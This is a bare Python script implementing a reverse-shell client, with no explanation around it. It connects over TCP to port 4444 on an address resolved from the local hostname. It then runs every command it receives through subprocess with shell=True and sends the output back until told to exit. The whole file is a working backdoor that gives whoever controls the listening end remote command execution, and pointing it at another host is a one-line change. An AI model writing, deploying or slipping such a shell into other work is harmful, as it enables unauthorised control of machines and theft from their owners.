#!/usr/bin/python

import socket
import subprocess

def shell():
	while True:
		command = client_socket.recv(1024).decode("utf-8")

		if command == "exit":
			client_socket.send("Connection is closed.".encode("utf-8"))
			break
		
		process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		result = process.stdout.read() + process.stderr.read()
		client_socket.send(result)

global client_socket
host = socket.gethostbyname(socket.gethostname())
port = 4444
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((host, port))

shell()
client_socket.close()